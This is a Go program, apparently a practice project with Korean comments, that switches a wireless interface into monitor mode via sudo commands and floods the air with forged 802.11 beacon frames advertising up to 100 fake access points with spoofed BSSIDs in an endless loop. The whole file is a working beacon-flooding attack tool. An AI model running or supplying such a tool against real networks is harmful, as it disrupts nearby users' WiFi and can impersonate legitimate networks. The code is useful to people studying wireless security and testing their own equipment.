package main

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"log"
	"os"
	"os/exec"
	"time"

	"github.com/google/gopacket/pcap"
)

func main() {
	BEC()
}

func Turnonmon(name string) {
	ExcuteCMD("sudo", "ifconfig", name, "down")
	fmt.Println(name + " is down")
	ExcuteCMD("sudo", "iwconfig", name, "mode", "monitor")
	fmt.Println(name + " turn monitor mode")
	ExcuteCMD("sudo", "ifconfig", name, "up")
	fmt.Println(name + " is up \n")
}

func ExcuteCMD(script string, arg ...string) {
	cmd := exec.Command(script, arg...)
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println(string(output))
		fmt.Println((err))
	} else {
		fmt.Println(string(output))
	}
}

type H4uN_packet struct {
	dumpdata  [24]byte // 몰라 버려
	Signiture [4]byte  //0x00800000 radiotap 시그니처
	dumpdata2 [12]byte
	BSSID     [6]byte  //mac 주소
	dumpdata3 [15]byte //버려
}

type H4uN_Name_Packet struct {
	name_length uint   //61번째 바이트가 이름 길이 플래그
	name        []byte //이름 데이터 SSID
}

type H4uN_dump struct {
	name_footer [4]byte //0x01, 0x08, 0x82, 0x84 이름 시그니처
	dumpdata3   [230]byte
}

const (
	defaultSnapLen = 262144
)

func CreateBeacon(name_val string, i int) *bytes.Buffer {
	buffer := new(bytes.Buffer)
	var Head_pack H4uN_packet
	var Dump_pack H4uN_dump

	//해더 정보 입력
	Head_pack.dumpdata = [24]byte{0x00, 0x00, 0x18, 0x00, 0x2e, 0x40, 0x00, 0xa0, 0x20, 0x08, 0x00, 0x00, 0x00, 0x02, 0x7b, 0x09, 0xa0, 0x00, 0xc7, 0x00, 0x00, 0x00, 0xc7, 0x00}
	Head_pack.Signiture = [4]byte{0x80, 0x00, 0x00, 0x00}
	Head_pack.dumpdata2 = [12]byte{0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xFF, 0x00, 0xFF, 0x00, 0xFF, byte(i)}
	Head_pack.BSSID = [6]byte{0xFF, 0x00, 0xFF, 0x00, 0xFF, byte(i)}
	Head_pack.dumpdata3 = [15]byte{0xFF, 0x00, 0xFF, 0x00, 0xFF, byte(i), 0x44, 0x01, 0x00, 0x00, 0x64, 0x00, 0x11, 0x0c, 0x00}
	binary.Write(buffer, binary.LittleEndian, Head_pack)

	//이름 정보 입력
	Beacon_name := name_val + string(rune(i))
	LEN_Bea := len(Beacon_name) + 1
	binary.Write(buffer, binary.LittleEndian, uint8(LEN_Bea))
	buffer.WriteString(Beacon_name)

	//이름 푸터, 덤프파일 입력
	Dump_pack.name_footer = [4]byte{0x01, 0x08, 0x82, 0x84}
	Dump_pack.dumpdata3 = [230]byte{0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24, 0x03, 0x01, 0x0a, 0x05, 0x04, 0x01, 0x03, 0x00, 0x02, 0x2a, 0x01, 0x04, 0x32, 0x04, 0x30, 0x48, 0x60, 0x6c, 0x0b, 0x05, 0x00, 0x00, 0x2b, 0x00, 0x00, 0x2d, 0x1a, 0xee, 0x19, 0x1e, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x18, 0x04, 0x81, 0x08, 0x00, 0x3d, 0x16, 0x0a, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x30, 0x14, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x00, 0x00, 0xdd, 0x18, 0x00, 0x50, 0xf2, 0x02, 0x01, 0x01, 0x80, 0x00, 0x03, 0xa4, 0x00, 0x00, 0x27, 0xa4, 0x00, 0x00, 0x42, 0x43, 0x5e, 0x00, 0x62, 0x32, 0x2f, 0x00, 0xdd, 0x06, 0x00, 0xe0, 0x4c, 0x02, 0x01, 0x60, 0xdd, 0x4f, 0x00, 0x50, 0xf2, 0x04, 0x10, 0x4a, 0x00, 0x01, 0x10, 0x10, 0x44, 0x00, 0x01, 0x02, 0x10, 0x54, 0x00, 0x08, 0x00, 0x06, 0x00, 0x50, 0xf2, 0x04, 0x00, 0x01, 0x10, 0x11, 0x00, 0x08, 0x4d, 0x45, 0x53, 0x48, 0x5f, 0x32, 0x5f, 0x32, 0x10, 0x08, 0x00, 0x02, 0x00, 0x80, 0x10, 0x47, 0x00, 0x10, 0x63, 0x04, 0x12, 0x53, 0x10, 0x19, 0x20, 0x06, 0x12, 0x28, 0x70, 0x5d, 0xcc, 0xe8, 0x69, 0xa4, 0x10, 0x3c, 0x00, 0x01, 0x03, 0x10, 0x49, 0x00, 0x06, 0x00, 0x37, 0x2a, 0x00, 0x01, 0x20, 0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
	binary.Write(buffer, binary.LittleEndian, Dump_pack)

	return buffer
}

func BEC() {
	fmt.Println("__BEC Start__")

	var name string
	fmt.Printf("Input Wireless interface Name : ")
	fmt.Scanln(&name)

	var loop int
	fmt.Printf("Input loop number(under 100) : ")
	fmt.Scanln(&loop)

	if (loop > 100) || (loop < 1) {
		fmt.Println("Not available input value")
		os.Exit(-1)
	}

	var Beacon_name string
	fmt.Printf("Input WiFi Name : ")
	fmt.Scanln(&Beacon_name)

	handle, err := pcap.OpenLive(name, defaultSnapLen, true, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
		os.Exit(-1)
	}
	defer handle.Close()

	Turnonmon(name) // turn on monitor mode

	for {
		for i := 0; i < loop; i++ {

			Buffer := CreateBeacon(Beacon_name, i)
			Beacon_Packet := Buffer.Bytes()
			handle.WritePacketData(Beacon_Packet)
			time.Sleep(time.Millisecond * 50)
		}

	}
}
